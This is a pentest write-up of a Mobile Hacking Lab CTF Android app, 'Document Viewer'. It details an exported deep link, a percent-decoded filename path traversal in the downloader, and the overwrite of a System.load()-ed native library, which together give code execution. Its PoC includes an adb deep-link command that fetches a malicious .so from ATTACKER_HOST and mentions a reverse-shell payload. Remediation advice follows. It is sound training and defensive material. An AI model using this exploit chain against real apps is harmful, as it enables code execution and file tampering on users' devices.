# Mobile App Pentest — `com.mobilehackinglab.documentviewer` ("Document Viewer")

**Target:** `com.mobilehackinglab.documentviewer.apk` — Mobile Hacking Lab "Document Viewer" challenge
**Platform:** Android (minSdk 24, targetSdk 33)
**Basis:** CTF / lab / training
**Date:** 2026-11-02
**Verification:** Identified by static analysis (jadx). The chain (exported deep link → filename path
traversal in the downloader → overwrite of the `System.load()`-ed native library → native RCE on
next launch) is a deterministic code path. PoC deep link + payload placement provided; on-device run
pending.

---

## Summary

Document Viewer is a PDF viewer. Besides rendering PDFs with the platform `PdfRenderer`, it tries to
load an optional **native "Pro" library** at startup and call into it:

```java
// MainActivity.loadProLibrary()  (called from onCreate)
String abi = Build.SUPPORTED_ABIS[0];
File libraryFile = new File(getFilesDir(), "native-libraries/" + abi + "/libdocviewer_pro.so");
System.load(libraryFile.getAbsolutePath());   // loads whatever is at this path
this.proFeaturesEnabled = true;
...
if (this.proFeaturesEnabled) initProFeatures();  // native method
```
No `.so` ships in the APK (this is the "Free" build), so that path is **empty and attacker-fillable**.

Separately, the **exported** `MainActivity` handles `VIEW` deep links for `file`/`http`/`https` +
`application/pdf`, and `CopyUtil.copyFileFromUri` downloads the URI and writes it to a file **named
from the URI**:
```java
File outFile = new File(DOWNLOADS_DIRECTORY, uri.getLastPathSegment());  // DOWNLOADS = /sdcard/Download
// coroutine: outFile.getParentFile().mkdirs();  then download $url -> outFile
```
`Uri.getLastPathSegment()` **percent-decodes** its result, so an encoded `%2F` becomes a real `/` and
`..` stays `..` — i.e. the "filename" can contain path-traversal sequences. Because the coroutine
also `mkdirs()` the parent, an attacker-supplied URL can write arbitrary content **anywhere the app
can write**, including the internal `native-libraries/<abi>/libdocviewer_pro.so` slot.

Drop a malicious `.so` there, relaunch, and `System.load` + `initProFeatures()` execute **attacker
native code in the app's process** — which holds `MANAGE_EXTERNAL_STORAGE`.

| ID | Finding | Severity | MASVS |
|----|---------|----------|-------|
| DV-01 | Path traversal → arbitrary file write — `CopyUtil.copyFileFromUri` names the output from `uri.getLastPathSegment()` (percent-decoded) and `mkdirs()`+writes it; reachable from the exported `VIEW` deep link | **Critical** | MASVS-PLATFORM-1 / MASVS-CODE-4 |
| DV-02 | Native-code RCE — overwrite `filesDir/native-libraries/<abi>/libdocviewer_pro.so`, which `loadProLibrary()` `System.load()`s and calls `initProFeatures()` on next launch | **Critical** | MASVS-CODE-4 / MASVS-RESILIENCE-2 |
| DV-03 | `MANAGE_EXTERNAL_STORAGE` held → DV-01's arbitrary write also covers all shared storage (impact amplifier) | High | MASVS-STORAGE-2 |
| DV-04 | `network_security_config` sets `cleartextTrafficPermitted="true"` → payload/doc fetched over plain HTTP (and MITM-able) | Medium | MASVS-NETWORK-1 |
| DV-05 | `android:debuggable="true"` in shipped APK | Medium | MASVS-RESILIENCE-1 |
| DV-06 | `android:allowBackup="true"` | Medium | MASVS-STORAGE-2 |

---

## DV-01 — Filename path traversal in the downloader

**Entry (exported, auto-processing)** — `MainActivity.handleIntent()` runs on launch and feeds any
`VIEW` URI straight into the copier (no user action):
```java
if ("android.intent.action.VIEW".equals(action) && data != null)
    CopyUtil.INSTANCE.copyFileFromUri(data).observe(this, uri -> renderPdf(uri));
```
**Sink** — the output path is built from the URI's last path segment:
```java
String lastPathSegment = uri.getLastPathSegment();        // percent-DECODED
File outFile = new File(DOWNLOADS_DIRECTORY, lastPathSegment == null ? "download.pdf" : lastPathSegment);
```
`DOWNLOADS_DIRECTORY = Environment.getExternalStoragePublicDirectory(DIRECTORY_DOWNLOADS)` =
`/storage/emulated/0/Download`. `Uri.getLastPathSegment()` returns the decoded final path segment, so
a URL whose last segment is `x%2F..%2F..%2F…` decodes to `x/../../…` — path traversal. The download
coroutine then creates the parent dirs and writes the fetched bytes:
```java
outFile.getParentFile().mkdirs();
// http(s): HttpURLConnection.getInputStream()  (or file://: url.openStream())  -> FileOutputStream(outFile)
```
There is no canonicalization or containment check on `outFile`, so the write lands wherever the
traversal points. (For `http(s)` the *source* is the attacker's server — which can serve the payload
for any request path — and the *destination* is the traversal, so the two are independent; `file://`
would tie them together, so HTTP is the clean delivery.)

## DV-02 — Escalation to native-code execution

Target the write at the library slot `loadProLibrary()` reads:
```
/data/data/com.mobilehackinglab.documentviewer/files/native-libraries/<abi>/libdocviewer_pro.so
```
`<abi>` is `Build.SUPPORTED_ABIS[0]` (e.g. `x86_64` on an emulator, `arm64-v8a` on a phone). The app
can always write its own internal data dir, and the coroutine's `mkdirs()` creates the
`native-libraries/<abi>/` folder if missing. On the next launch `System.load()` maps the attacker
`.so` and `JNI_OnLoad`/`initProFeatures()` run in-process → **RCE**.

### PoC
1. Build a malicious `libdocviewer_pro.so` for the device ABI whose `JNI_OnLoad` (or exported
   `initProFeatures`) runs the payload (e.g. drops a file / reverse shell). Host it so the attacker
   server returns it for the crafted path (catch-all handler).
2. Fire the exported deep link (any app / browser / `adb`). The traversal writes the `.so` into the
   Pro-library slot; the leading `x/..` cancels, the `..` sequences climb to `/`, then descend into
   the app's data dir:
   ```bash
   adb shell am start -a android.intent.action.VIEW -t application/pdf \
     -d "https://ATTACKER_HOST/x%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2F<abi>%2Flibdocviewer_pro.so"
   ```
   (decoded last segment: `x/../../../../../../data/data/com.mobilehackinglab.documentviewer/files/native-libraries/<abi>/libdocviewer_pro.so`)
3. Relaunch the app → `loadProLibrary()` → `System.load(...)` → `initProFeatures()` → payload runs as
   `com.mobilehackinglab.documentviewer` (holding `MANAGE_EXTERNAL_STORAGE` + `INTERNET`).

DV-01 on its own is already an arbitrary-file-write primitive: with `MANAGE_EXTERNAL_STORAGE`, the
same traversal can overwrite files across shared storage, not just the library slot.

---

## DV-04 / DV-05 / DV-06 — Supporting weaknesses
- **`cleartextTrafficPermitted="true"`** — the payload (and any viewed document) can be fetched over
  plain HTTP, enabling both easy hosting and network MITM of document content.
- **`debuggable="true"`** → `run-as`/debugger access to app-private data.
- **`allowBackup="true"`** → `adb backup` can pull app-private data.

---

## Root cause & remediation
- **Never derive a filesystem path from untrusted input without containment.** Canonicalize the
  resolved path and verify it stays within the intended directory
  (`file.getCanonicalPath().startsWith(downloadsDir.getCanonicalPath() + File.separator)`); strip path
  separators from `getLastPathSegment()`; prefer a server-independent generated filename.
- **Don't `System.load()` from a writable, app-data path.** Load native libraries only from the APK's
  packaged `lib/` (via `System.loadLibrary`), which is verified and read-only; never from a directory
  that any code path can write.
- **Treat the exported deep link as hostile** — validate the URI/host, don't auto-download and
  auto-open, and don't fetch over cleartext. Drop `MANAGE_EXTERNAL_STORAGE` for a PDF viewer; use
  SAF/scoped access. Disable `debuggable`/`allowBackup` for release builds.

---

## Appendix — environment & method
- Tools: `unzip`, `jadx` (decompile + manifest decode). No `.so` bundled (Free build → empty Pro-lib
  slot). Key behavior: `Uri.getLastPathSegment()` percent-decodes, turning `%2F` into a traversal
  separator; the download coroutine `mkdirs()` + writes with no path containment.
- App classes: `MainActivity` (exported `VIEW` handler, `handleIntent`→`copyFileFromUri`→`renderPdf`;
  `loadProLibrary` + native `initProFeatures`), `CopyUtil` (`copyFileFromUri` traversal sink,
  `copyFileFromAssets`), and the download coroutine `CopyUtil$Companion$copyFileFromUri$1`.
